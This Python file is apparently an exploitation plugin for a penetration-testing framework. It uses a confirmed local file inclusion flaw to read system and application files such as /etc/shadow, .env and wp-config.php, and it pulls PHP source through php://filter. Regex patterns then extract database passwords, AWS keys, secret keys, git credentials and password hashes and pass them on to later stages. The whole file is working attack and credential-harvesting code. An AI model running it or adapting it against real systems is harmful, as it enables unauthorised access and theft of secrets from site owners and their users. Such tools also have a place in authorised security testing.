"""LFI config file extraction â€” read sensitive files through confirmed LFI."""

from __future__ import annotations

import base64
import logging
import re
from typing import Any, ClassVar
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target
from basilisk.utils.http import resolve_base_urls

logger = logging.getLogger(__name__)

# High-value files to harvest, ordered by priority
TARGET_FILES: list[tuple[str, str]] = [
    ("/etc/passwd", "Unix user list"),
    ("/etc/shadow", "Unix password hashes"),
    ("/proc/self/environ", "Process environment variables"),
    ("/.env", "Application environment config"),
    ("/config.php", "PHP config"),
    ("/wp-config.php", "WordPress config"),
    ("/configuration.php", "Joomla config"),
    ("/config/database.yml", "Rails database config"),
    ("/config/database.php", "Laravel database config"),
    ("/application/config/database.php", "CodeIgniter DB config"),
    ("/settings.py", "Django settings"),
    ("/appsettings.json", "ASP.NET config"),
    ("/web.config", "IIS/ASP.NET config"),
    ("/.git/config", "Git repository config"),
    ("/app/etc/local.xml", "Magento config"),
    ("/config/app.yml", "Application config"),
    ("/WEB-INF/web.xml", "Java webapp descriptor"),
]

# PHP filter wrappers for source code extraction
PHP_FILTER_TARGETS = [
    "index.php",
    "config.php",
    "wp-config.php",
    "includes/config.php",
    "application/config/config.php",
    "db.php",
    "database.php",
    "connect.php",
]

# Regex patterns to extract credentials from file contents
CREDENTIAL_PATTERNS: list[tuple[str, str, str]] = [
    # (.env style)
    (r"DB_PASSWORD\s*=\s*['\"]?([^'\"\s\n]+)", "db_password", ".env"),
    (r"DB_USERNAME\s*=\s*['\"]?([^'\"\s\n]+)", "db_username", ".env"),
    (r"DB_USER\s*=\s*['\"]?([^'\"\s\n]+)", "db_user", ".env"),
    (r"SECRET_KEY\s*=\s*['\"]?([^'\"\s\n]+)", "secret_key", ".env"),
    (r"API_KEY\s*=\s*['\"]?([^'\"\s\n]+)", "api_key", ".env"),
    (r"AWS_ACCESS_KEY_ID\s*=\s*['\"]?([^'\"\s\n]+)", "aws_key", ".env"),
    (r"AWS_SECRET_ACCESS_KEY\s*=\s*['\"]?([^'\"\s\n]+)", "aws_secret", ".env"),
    (r"APP_KEY\s*=\s*['\"]?([^'\"\s\n]+)", "app_key", ".env"),
    (r"MAIL_PASSWORD\s*=\s*['\"]?([^'\"\s\n]+)", "mail_password", ".env"),
    # WordPress wp-config.php
    (r"define\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'", "db_password", "wp-config"),
    (r"define\(\s*'DB_USER'\s*,\s*'([^']+)'", "db_user", "wp-config"),
    (r"define\(\s*'AUTH_KEY'\s*,\s*'([^']+)'", "auth_key", "wp-config"),
    (r"define\(\s*'SECURE_AUTH_KEY'\s*,\s*'([^']+)'", "secure_auth_key", "wp-config"),
    # Generic PHP config
    (r"\$db_pass(?:word)?\s*=\s*['\"]([^'\"]+)['\"]", "db_password", "php-config"),
    (r"\$db_user(?:name)?\s*=\s*['\"]([^'\"]+)['\"]", "db_user", "php-config"),
    (r"\$password\s*=\s*['\"]([^'\"]+)['\"]", "password", "php-config"),
    # YAML/JSON config
    (r"password:\s*['\"]?([^'\"\s\n]+)", "password", "yaml-config"),
    (r"secret:\s*['\"]?([^'\"\s\n]+)", "secret", "yaml-config"),
    (r'"password"\s*:\s*"([^"]+)"', "password", "json-config"),
    (r'"secret"\s*:\s*"([^"]+)"', "secret", "json-config"),
    # Django settings.py
    (r"'PASSWORD'\s*:\s*'([^']+)'", "db_password", "django"),
    (r"SECRET_KEY\s*=\s*'([^']+)'", "secret_key", "django"),
    # Connection strings
    (r"(?:password|pwd)=([^;\s]+)", "password", "conn-string"),
    # Git config
    (r"url\s*=\s*https?://([^:]+):([^@]+)@", "git_cred", "git-config"),
    # /etc/shadow hashes
    (r"^(\w+):(\$\d\$[^:]+):", "shadow_hash", "shadow"),
    # AWS env vars
    (r"AWS_ACCESS_KEY_ID=([A-Z0-9]{20})", "aws_key", "environ"),
    (r"AWS_SECRET_ACCESS_KEY=([A-Za-z0-9/+=]{40})", "aws_secret", "environ"),
]

# Markers that confirm real file content (not error pages)
PASSWD_MARKER = re.compile(r"root:.*:0:0:")
ENV_MARKER = re.compile(r"(?:DB_|SECRET_|API_|APP_)\w+=")
SHADOW_MARKER = re.compile(r"\w+:\$\d\$")


class LfiHarvestPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="lfi_harvest",
        display_name="LFI Config Harvester",
        category=PluginCategory.EXPLOITATION,
        description="Extract sensitive config files and credentials through confirmed LFI",
        depends_on=["lfi_check"],
        produces=["lfi_files", "credentials"],
        timeout=90.0,
        risk_level="destructive",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(self.meta.name, target.host, error="HTTP client required")

        findings: list[Finding] = []
        data: dict[str, Any] = {"files": [], "credentials": []}

        # Get confirmed LFI vectors from lfi_check
        lfi_result = ctx.pipeline.get(f"lfi_check:{target.host}")
        if not lfi_result or not lfi_result.ok:
            findings.append(Finding.info(
                "No confirmed LFI vectors available",
                description="lfi_check did not find exploitable LFI",
                tags=["lfi", "harvest"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        lfi_tests = lfi_result.data.get("lfi_tests", [])
        if not lfi_tests:
            findings.append(Finding.info(
                "No confirmed LFI test data",
                tags=["lfi", "harvest"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        # Resolve base URL
        base_urls = await resolve_base_urls(target, ctx)
        base_url = base_urls[0] if base_urls else f"https://{target.host}"

        # Group LFI vectors by type
        traversal_vectors: list[dict] = []
        php_filter_vectors: list[dict] = []
        for test in lfi_tests:
            label = test.get("label", "")
            if "php_filter" in label or "php://filter" in test.get("payload", ""):
                php_filter_vectors.append(test)
            else:
                traversal_vectors.append(test)

        # Use the first working vector of each type
        traversal = traversal_vectors[0] if traversal_vectors else None
        php_filter = php_filter_vectors[0] if php_filter_vectors else None

        # Phase 1: Read config files via path traversal
        if traversal:
            await self._harvest_traversal(ctx, base_url, traversal, findings, data)

        # Phase 2: Read source code via PHP filters
        if php_filter and not ctx.should_stop:
            await self._harvest_php_filter(ctx, base_url, php_filter, findings, data)

        # Extract credentials from all harvested content
        for file_entry in data["files"]:
            self._extract_credentials(file_entry, data)

        # Feed credentials to shared state
        if data["credentials"]:
            creds = ctx.state.setdefault("credentials", [])
            creds.extend(data["credentials"])

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )

    async def _harvest_traversal(
        self, ctx, base_url: str, vector: dict,
        findings: list[Finding], data: dict,
    ) -> None:
        """Read sensitive files using path traversal payload template."""
        path = vector.get("path", "")
        param = vector.get("param", "")
        payload_template = vector.get("payload", "")

        if not path or not param or not payload_template:
            return

        # Determine traversal prefix (e.g., "../../../../")
        # The original payload targeted /etc/passwd, so extract the prefix
        prefix = self._extract_traversal_prefix(payload_template)
        if not prefix:
            return

        url_base = base_url.rstrip("/") + "/" + path.lstrip("/")

        for target_file, description in TARGET_FILES:
            if ctx.should_stop:
                break

            file_payload = prefix + target_file.lstrip("/")
            test_url = self._inject_param(url_base, param, file_payload)

            try:
                async with ctx.rate:
                    resp = await ctx.http.get(test_url, timeout=10.0)
                    body = await resp.text(encoding="utf-8", errors="replace")

                if resp.status != 200 or len(body) < 10:
                    continue

                # Validate we got real file content, not an error page
                if not self._is_real_content(target_file, body):
                    continue

                # Truncate very large files
                content = body[:10000] if len(body) > 10000 else body

                data["files"].append({
                    "path": target_file,
                    "content": content,
                    "size": len(body),
                    "method": "traversal",
                })

                severity_fn = Finding.critical
                if target_file in ("/etc/shadow", "/proc/self/environ"):
                    severity_fn = Finding.critical
                elif target_file == "/etc/passwd":
                    severity_fn = Finding.high

                findings.append(severity_fn(
                    f"LFI File Read: {target_file}",
                    evidence=f"URL: {test_url}\nContent preview:\n{content[:500]}",
                    description=f"Read {description} via path traversal",
                    remediation=(
                        "Validate and sanitize file path input. "
                        "Use allowlists instead of blocklists."
                    ),
                    tags=["lfi", "file-read", "harvest"],
                    verified=True,
                ))

            except Exception as e:
                logger.debug("LFI harvest error for %s: %s", target_file, e)
                continue

    async def _harvest_php_filter(
        self, ctx, base_url: str, vector: dict,
        findings: list[Finding], data: dict,
    ) -> None:
        """Read source code using php://filter wrappers."""
        path = vector.get("path", "")
        param = vector.get("param", "")

        if not path or not param:
            return

        url_base = base_url.rstrip("/") + "/" + path.lstrip("/")

        for php_file in PHP_FILTER_TARGETS:
            if ctx.should_stop:
                break

            filter_payload = (
                f"php://filter/convert.base64-encode/resource={php_file}"
            )
            test_url = self._inject_param(url_base, param, filter_payload)

            try:
                async with ctx.rate:
                    resp = await ctx.http.get(test_url, timeout=10.0)
                    body = await resp.text(encoding="utf-8", errors="replace")

                if resp.status != 200 or len(body) < 20:
                    continue

                # Try to find base64-encoded content in response
                decoded = self._try_decode_b64(body)
                if not decoded or len(decoded) < 10:
                    continue

                content = decoded[:10000]
                data["files"].append({
                    "path": php_file,
                    "content": content,
                    "size": len(decoded),
                    "method": "php_filter",
                })

                findings.append(Finding.critical(
                    f"LFI Source Code Read: {php_file}",
                    evidence=f"URL: {test_url}\nDecoded content preview:\n{content[:500]}",
                    description="Read PHP source code via php://filter",
                    remediation="Disable allow_url_include. Validate file path input.",
                    tags=["lfi", "source-code", "php-filter", "harvest"],
                    verified=True,
                ))

            except Exception as e:
                logger.debug("PHP filter harvest error for %s: %s", php_file, e)
                continue

    def _extract_traversal_prefix(self, payload: str) -> str:
        """Extract the directory traversal prefix from a known-working payload."""
        # Match sequences like ../../../../, ..%2f..%2f, ..\/..\/
        match = re.match(r"((?:\.\.[/\\%]+)+)", payload)
        if match:
            return match.group(1)
        # If payload is the full path, try to find prefix before 'etc/passwd'
        idx = payload.find("etc/passwd")
        if idx > 0:
            return payload[:idx]
        idx = payload.find("etc%2fpasswd")
        if idx > 0:
            return payload[:idx]
        # Fallback: use a standard traversal depth
        return "../../../../"

    def _is_real_content(self, target_file: str, body: str) -> bool:
        """Check if response contains real file content vs error page."""
        if "/etc/passwd" in target_file:
            return bool(PASSWD_MARKER.search(body))
        if "/etc/shadow" in target_file:
            return bool(SHADOW_MARKER.search(body))
        if ".env" in target_file:
            return bool(ENV_MARKER.search(body))
        if "wp-config.php" in target_file:
            return "DB_PASSWORD" in body or "DB_NAME" in body
        if "web.config" in target_file:
            return "<configuration" in body.lower()
        if ".git/config" in target_file:
            return "[core]" in body or "[remote" in body
        if "environ" in target_file:
            return "PATH=" in body or "HOME=" in body
        if target_file.endswith(".xml"):
            return "<?xml" in body or "<web-app" in body
        if target_file.endswith(".json"):
            return body.strip().startswith("{") or body.strip().startswith("[")
        if target_file.endswith(".yml") or target_file.endswith(".yaml"):
            return ":" in body and "<html" not in body.lower()
        # For generic config files, check it's not an HTML error page
        return "<html" not in body.lower()[:200]

    def _try_decode_b64(self, body: str) -> str:
        """Try to find and decode base64 content from the response."""
        # Remove HTML tags
        clean = re.sub(r"<[^>]+>", "", body).strip()
        # Try the whole cleaned body
        candidates = [clean]
        # Also try finding long base64 blocks
        b64_blocks = re.findall(r"[A-Za-z0-9+/=]{40,}", clean)
        candidates.extend(b64_blocks)

        for candidate in candidates:
            candidate = candidate.strip()
            if len(candidate) < 20:
                continue
            try:
                decoded = base64.b64decode(candidate).decode("utf-8", errors="replace")
                # Validate it looks like PHP/config source
                if "<?php" in decoded or "=" in decoded or "function" in decoded:
                    return decoded
            except Exception:
                continue
        return ""

    def _extract_credentials(self, file_entry: dict, data: dict) -> None:
        """Extract credentials from file content using regex patterns."""
        content = file_entry.get("content", "")
        file_path = file_entry.get("path", "")

        for pattern, label, _source in CREDENTIAL_PATTERNS:
            matches = re.finditer(pattern, content, re.MULTILINE)
            for match in matches:
                if label == "shadow_hash":
                    if len(match.groups()) >= 2:
                        data["credentials"].append({
                            "username": match.group(1),
                            "password": match.group(2),
                            "source": f"lfi_harvest:{file_path}",
                            "type": "hash",
                            "verified": "false",
                        })
                elif label == "git_cred":
                    if len(match.groups()) >= 2:
                        data["credentials"].append({
                            "username": match.group(1),
                            "password": match.group(2),
                            "source": f"lfi_harvest:{file_path}",
                            "type": "plaintext",
                            "verified": "false",
                        })
                else:
                    key_type = "username" if "user" in label else "password"
                    data["credentials"].append({
                        key_type: match.group(1),
                        "label": label,
                        "source": f"lfi_harvest:{file_path}",
                        "type": "plaintext",
                        "verified": "false",
                    })

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Replace a query parameter value with the payload."""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
